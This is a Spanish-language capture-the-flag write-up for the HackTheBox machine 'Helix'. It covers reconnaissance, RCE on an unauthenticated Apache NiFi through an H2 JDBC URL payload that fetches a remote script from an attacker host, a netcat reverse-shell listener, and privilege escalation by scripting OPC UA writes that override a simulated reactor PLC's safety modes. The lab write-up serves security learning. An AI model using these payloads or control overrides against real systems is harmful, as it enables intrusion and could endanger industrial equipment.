---
title: "Helix htb note"
machine: "Helix"
platform: "HackTheBox"
os: "Linux"
difficulty: "Unknown"
tags: ["CVE", "RCE", "Privesc", "Web"]
retired: true
summary: "lo primero que hago siempre en ctf es un escaneo de puertos y servicios y posteriormente un escaneo de scripts basicos y vuln con nmap"
draft: false
---
# Reconocimiento

lo primero que hago siempre en ctf es un escaneo de puertos y servicios y posteriormente un escaneo de scripts basicos y vuln con nmap

![image.png](/img/helix/1.png)

solo 2 puertos abiertos hasta ahora y un dominio que agregamos al /etc/hosts

![image.png](/img/helix/2.png)

cosas a destacar es 

**Superficie de ataque:** solo 2 puertos abiertos.

**Puerto 22 — SSH**

- **OpenSSH 8.9p1** en Ubuntu — versión relativamente reciente, poco probable que sea el vector inicial. Útil si consigues credenciales.

**Puerto 80 — HTTP**

- **nginx 1.18.0** redirige a `http://helix.htb/` → ya agregaste el virtual host al `/etc/hosts`, bien.
- El título vacío (`Did not follow redirect`) sugiere que **todo el contenido está bajo el vhost**, sin él no hay nada.

### Análisis de versiones

### nginx 1.18.0

Versión del **2020**, bastante desactualizada. Vulnerabilidades relevantes (descartando DoS):

- **CVE-2021-23017** — Off-by-one en el resolver DNS de nginx. Permite RCE/corrupción de memoria si nginx usa un resolver DNS malicioso. *Poco explotable en la práctica salvo configuración específica.*
- **CVE-2020-12440** — HTTP Request Smuggling en ciertas configuraciones de proxy reverso. Útil si hay un backend detrás.
- Misconfigs clásicas más probables que un CVE: **alias traversal** (`/files../`), **open redirect**, exposición de `.git`, métodos HTTP habilitados (PUT/DELETE).

**Veredicto:** nginx aquí actúa probablemente solo como proxy reverso hacia una app. El vector real estará en la **aplicación web**, no en nginx directamente.

---

### OpenSSH 8.9p1 Ubuntu 3ubuntu0.15

- La versión base 8.9p1 tiene **CVE-2023-38408** (agente SSH, RCE remoto vía ssh-agent forwarding) — solo explotable si el cliente usa agent forwarding hacia el servidor, no aplica para acceso inicial.
- El parche **3ubuntu0.15** es muy reciente/parcheado por Ubuntu, sugiere que está al día en fixes de seguridad.
- **CVE-2024-6387 (regreSSHion)** afecta OpenSSH < 8.9p1 en Linux — esta versión está **en el límite**, pero el patchlevel de Ubuntu (`3ubuntu0.15`) muy probablemente incluye el backport del fix.

**Veredicto:** SSH está prácticamente descartado como vector inicial. Su rol aquí es post-explotación con credenciales.

# Reconocimiento web

intente consultas dns pero esta cerrado y al parecer no hay waff protegiendo la pagina analizamos tambien el url de la pag 

Lo que sí importa como contexto para HTB:

- Empresa ficticia de **ICS/SCADA/OT security**
- Menciona: **IEC 62443, ISO 27001, ISA-99** — estándares de seguridad industrial
- Tecnologías nombradas: Siemens, Rockwell, ABB, Emerson, Honeywell, Yokogawa, PROFINET, EtherNet/IP, Modbus TCP

Esto podría ser lore relevante si más adelante aparece un panel con credenciales por defecto de alguno de estos sistemas o un servicio relacionado con SCADA.

```jsx
❯ wafw00f http://helix.htb

                   ______
                  /      \
                 (  Woof! )
                  \  ____/                      )
                  ,,                           ) (_
             .-. -    _______                 ( |__|
            ()``; |==|_______)                .)|__|
            / ('        /|\                  (  |__|
        (  /  )        / | \                  . |__|
         \(_)_))      /  |  \                   |__|

                    ~ WAFW00F : v2.3.2 ~
    The Web Application Firewall Fingerprinting Toolkit
    
[*] Checking http://helix.htb
[+] Generic Detection results:
[-] No WAF detected by the generic detection
[~] Number of requests: 7

     ~/HTB/Helix  ✔  

```

 ahora enumerare directorios y sub dominios 

![image.png](/img/helix/3.png)

obtuvimos un vhots lo agregaremos al etc/host tambien 

y pues me llevo a una pagina interesente 

![image.png](/img/helix/4.png)

de esto sacamos varias cositas 

### Apache NiFi 1.21.0

Esto es muy interesante. Es un **Apache NiFi** expuesto sin autenticación (acceso directo a `/nifi/`).

Lo relevante:

- **Versión: 1.21.0** — tiene CVEs conocidos y explotables
- **Sin autenticación** — acceso libre al canvas
- Hay un flow activo con dos processors: **LogAttribute** y **ExecuteSQL** — hay una base de datos conectada en algún lado
- El processor **ExecuteSQL** está en estado **stopped** (cuadro rojo) con una advertencia

**El vector más directo:** `ExecuteProcessor` o `ExecuteScript` en NiFi permiten **RCE** agregando un processor malicioso al canvas. Con acceso sin auth esto es trivial.

CVE relevante: **CVE-2023-34468** — RCE via ExecuteSQL/JDBC URL en NiFi ≤ 1.21.0, permite ejecutar comandos arbitrarios a través de una URL JDBC maliciosa con H2.

El processor **ExecuteSQL** está conectado a un Controller Service llamado **`MaintenanceDB`** — esa es la pieza clave. Hay una base de datos real configurada en este NiFi.

mas cositas 

![image.png](/img/helix/5.png)

descargue el flow definition y analice el json

![image.png](/img/helix/6.png)

### Lo encontrado

**Base de datos H2 en memoria:**

- **JDBC URL:** `jdbc:h2:mem:maint;MODE=MySQL;DB_CLOSE_DELAY=-1`
- **Usuario:** `operator`
- **Password:** marcado como `sensitive: true` — no está en el JSON en texto claro

**Lo crítico aquí es la URL:** es una base de datos **H2 en memoria con modo MySQL**. Esto activa directamente **CVE-2022-45868 / CVE-2023-34468** — la JDBC URL de H2 permite ejecutar código Java arbitrario mediante el parámetro `INIT`:

`jdbc:h2:mem:maint;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://TU_IP/exploit.sql'`

El vector es modificar la `Database Connection URL` del Controller Service `MaintenanceDB` vía la API de NiFi para inyectar un payload en el `INIT` de H2 que ejecute un comando del sistema — lo que da RCE como el usuario que corre NiFi.

# Explotacion

## intento 1

bien busque mas a profundidad los sploit antes de ejecutar un ataque

---

### Opciones del menú contextual

Además de "Download flow definition" que ya usamos, lo relevante:

**"Configure"** — acceso directo a la configuración del Process Group, desde aquí puedes editar el Controller Service `MaintenanceDB` y modificar la JDBC URL sin tocar la API manualmente.

**"Enable all controller services"** — útil post-modificación para activar el servicio modificado de un click.

**"Disable all controller services"** — necesario **antes** de editar el Controller Service, ya que NiFi no permite modificar un servicio activo.

**"Upload template"** — permite subir un flow template XML malicioso con processors preconfigurados para RCE.

**"Variables"** — podría exponer variables del process group con valores sensibles hardcodeados.

---

El flujo de ataque más limpio es vía UI:

1. Disable all controller services
2. Configure → editar `MaintenanceDB` → modificar JDBC URL con payload H2
3. Enable all controller services → dispara el `INIT` → RCE

paso 1 clonar el exploit 

![image.png](/img/helix/7.png)

me pongo en escucha luego lanzo el exploit

```jsx
nc -lvnp 4444

```

![image.png](/img/helix/8.png)

![image.png](/img/helix/9.png)

# pivoting

aqui lo que hice fue revisar hasta que encontre en la base de datos credenciales que voy a crakear despues

![image.png](/img/helix/10.png)

### Credenciales encontradas

Directamente en el archivo:

`CREATE USER IF NOT EXISTS "NF" SALT '869124ad8f7db890' HASH '4ee2d71fcd6c41ff12c53741068da610e328c19b516fe060f83cb1d32c84a40a' ADMIN`

el primer intento fallo no encontre forma de crakearlo seguire enumerando 

finalmente encontre algo mas 

![image.png](/img/helix/11.png)

esto nos permite pivotar a ssh tenemos acceso de usuario

# post esplotacion (enumeracion)

desde el principio hubo algo que me llamo la atencion y es el pdf

![image.png](/img/helix/12.png)

me tranferi el archivo a mi kali con pyrhon y lo desencripte con john

![image.png](/img/helix/13.png)

es un manual muy interesante

![image.png](/img/helix/14.png)

esto nos explica o nos da ….

# Escalada de privilegios

### el vector de escalada a root

El PDF describe un sistema **OPC UA / PLC** de control de reactor. Hay un servicio OPC UA corriendo en la máquina que `operator` puede interactuar con.

El flujo de ataque que describe el documento sin querer:

1. Cambiar `Mode` a **MAINTENANCE**
2. Habilitar **TestOverride**
3. Usar **CalibrationOffset** para llevar temperatura a ~295°C o presión a ~73 bar — esto abre la **maintenance window**
4. Dentro de esa ventana hay "diagnostic tools" disponibles — probablemente RCE o acceso como root

efectivamente esta escuchando 

![image.png](/img/helix/15.png)

hago los preparativos necesarios port forwarding y instalo el opcua

![image.png](/img/helix/16.png)

enumeros los nodos 

```jsx
python3 -c "
from opcua import Client
c = Client('opc.tcp://localhost:4840')
c.connect()
root = c.get_root_node()
print('Root node:', root)
def browse(node, indent=0):
    for child in node.get_children():
        print(' '*indent, child, child.get_browse_name())
        browse(child, indent+2)
browse(root)
c.disconnect()
"
```

tambien los sub nodos

```jsx
❯ python3 -c "
from opcua import Client
c = Client('opc.tcp://localhost:4840')
c.connect()
nodes = ['ns=2;i=2', 'ns=2;i=7', 'ns=2;i=11']
for nid in nodes:
    node = c.get_node(nid)
    print('\n[', node.get_browse_name(), ']')
    for child in node.get_children():
        print(' ', child.get_browse_name(), '=', child.get_value())
c.disconnect()
"

[ QualifiedName(2:Reactor) ]
  QualifiedName(2:TemperatureRaw) = 283.99976074448244
  QualifiedName(2:Temperature) = 283.99976074448244
  QualifiedName(2:Pressure) = 68.99991280905017
  QualifiedName(2:CalibrationOffset) = 0.0

[ QualifiedName(2:Safety) ]
  QualifiedName(2:RodsInserted) = False
  QualifiedName(2:EmergencyCooling) = False
  QualifiedName(2:TripActive) = False

[ QualifiedName(2:Control) ]
  QualifiedName(2:Mode) = NORMAL
  QualifiedName(2:TestOverride) = False
  QualifiedName(2:ResetTrip) = False

     ~/HTB/Helix/content  ✔  
```

nodos de control 

```jsx
❯ python3 -c "
from opcua import Client
c = Client('opc.tcp://localhost:4840')
c.connect()
ctrl = c.get_node('ns=2;i=11')
for child in ctrl.get_children():
    print(child.nodeid, child.get_browse_name())
c.disconnect()
"
FourByteNodeId(ns=2;i=12) QualifiedName(2:Mode)
FourByteNodeId(ns=2;i=13) QualifiedName(2:TestOverride)
FourByteNodeId(ns=2;i=14) QualifiedName(2:ResetTrip)

     ~/HTB/Helix/content  ✔  
```

y los id del calibration

```jsx
❯ python3 -c "
from opcua import Client
c = Client('opc.tcp://localhost:4840')
c.connect()
reactor = c.get_node('ns=2;i=2')
for child in reactor.get_children():
    print(child.nodeid, child.get_browse_name())
c.disconnect()
"
FourByteNodeId(ns=2;i=3) QualifiedName(2:TemperatureRaw)
FourByteNodeId(ns=2;i=4) QualifiedName(2:Temperature)
FourByteNodeId(ns=2;i=5) QualifiedName(2:Pressure)
FourByteNodeId(ns=2;i=6) QualifiedName(2:CalibrationOffset)

     ~/HTB/Helix/content  ✔  
```

por ultimocejecutamos esto y segundos antes de que llegue a la temperatura maxima donde termina ejecutamos.. `ssh -i ~/.ssh/operator_id_ed25519 operator@helix.htb 'sudo /usr/local/sbin/helix-maint-console'`

```jsx
❯ python3 -c "
from opcua import Client
from opcua import ua
import time

c = Client('opc.tcp://localhost:4840')
c.session_timeout = 60000
c.connect()

c.get_node('ns=2;i=12').set_value(ua.DataValue(ua.Variant('MAINTENANCE', ua.VariantType.String)))
c.get_node('ns=2;i=13').set_value(ua.DataValue(ua.Variant(True, ua.VariantType.Boolean)))

for val in [2.0, 4.0, 6.0, 8.0, 10.0, 10.5, 11.0, 11.5]:
    c.get_node('ns=2;i=6').set_value(ua.DataValue(ua.Variant(val, ua.VariantType.Double)))
    time.sleep(5)
    temp = c.get_node('ns=2;i=4').get_value()
    pres = c.get_node('ns=2;i=5').get_value()
    trip = c.get_node('ns=2;i=9').get_value()
    print(f'Offset={val} Temp={temp:.2f} Pres={pres:.2f} Trip={trip}')
    if trip:
        print('TRIP ACTIVADO')
        break
    if temp >= 295.0:
        print('VENTANA ABIERTA - ejecuta el comando ahora!')
        time.sleep(60)
        break

c.disconnect()
"
Offset=2.0 Temp=286.32 Pres=69.22 Trip=False
Offset=4.0 Temp=288.39 Pres=69.25 Trip=False
Offset=6.0 Temp=290.44 Pres=69.28 Trip=False
Offset=8.0 Temp=292.47 Pres=69.29 Trip=False
Offset=10.0 Temp=294.51 Pres=69.31 Trip=False
Offset=10.5 Temp=294.87 Pres=69.26 Trip=True
TRIP ACTIVADO

     ~/HTB/Helix/content  took  33s  ✔  
```

![image.png](/img/helix/17.png)

hay que timear cuando lanzar el comando y con esto mi 2 maquina medium creo que era la segunda si no es que la tercera ha sido hackeada!

# cadena de ataque

  1.nmap → 22/ssh 80/http
→ helix.htb (vhost)
→ gobuster vhost → flow.helix.htb
→ Apache NiFi 1.21.0 (sin auth)
→ CVE-2023-34468 (H2 JDBC RCE)
→ shell nifi
→ /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
→ SSH operator
→ PDF cifrado → john → operator1
→ ss -tlnp → OPC UA :4840 (localhost)
→ port forward → MAINTENANCE + TestOverride + CalibrationOffset ramp
→ maintenance window → sudo /usr/local/sbin/helix-maint-console
→ root
